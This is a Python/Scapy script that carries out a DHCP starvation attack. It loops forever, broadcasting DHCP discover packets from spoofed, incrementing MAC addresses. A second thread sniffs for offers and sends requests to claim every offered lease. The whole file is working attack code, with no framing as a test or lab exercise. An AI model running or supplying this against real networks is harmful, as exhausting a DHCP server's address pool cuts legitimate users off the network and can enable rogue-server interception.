from scapy.all import *
import binascii
import threading
val=1000
scrmac_set="3C:61:B4:23:12:22"
scrmac_set_num=scrmac_set.replace(":","")
ethernet = Ether(src=scrmac_set, dst="FF:FF:FF:FF:FF:FF")
ip = IP(src='0.0.0.0', dst='255.255.255.255')
udp = UDP(sport=68, dport=67)
xid_rand = random.randint(1, 999999999)
c_id = binascii.unhexlify(scrmac_set_num)

def discover():
    global scrmac_set
    global scrmac_set_num
    global ethernet
    global val
    global c_id
    val=val+1
    valstr=str(val)
    valstr = valstr[:2] + ":" + valstr[2:]
    scrmac_set="3c:61:B4:23:"+valstr
    scrmac_set_num=scrmac_set.replace(":","")
    ethernet = Ether(src=scrmac_set, dst="FF:FF:FF:FF:FF:FF")
    c_id = binascii.unhexlify(scrmac_set_num)
    bootp = BOOTP(xid=xid_rand, chaddr=c_id)

    dhcp_d = DHCP(options=[("message-type", "discover"), "end"])  # 可添加("lease_time", 60) Dot1Q(vlan=1),flags=0x8000
    dhcp_discover = ethernet / ip / udp / bootp / dhcp_d
    sendp(dhcp_discover,count=1)
def listen_offer_send_request():
    pkt = sniff(filter="udp dst port 68", count=1,timeout=3)
    if pkt[0][DHCP].options[0][1]==2:
       _bootp = BOOTP(xid=pkt[0][BOOTP].xid,  chaddr=c_id)
       _dhcp = DHCP(options=[("message-type", "request"),("server_id", "192.167.2.1"),("requested_addr",pkt[0][BOOTP].yiaddr),"end"]) #pkt[BOOTP].yiaddr ("server_id", "192.168.1.4")Dot1Q(vlan=5)
       dhcp_request = ethernet /ip / udp / _bootp / _dhcp
       sendp(dhcp_request, count=1)

if __name__=='__main__':
    while(1):
        thread1 = threading.Thread(target=discover, name="Thread1")
        thread2 = threading.Thread(target=listen_offer_send_request, name="Thread2")
        thread2.start()
        thread1.start()
        thread2.join()



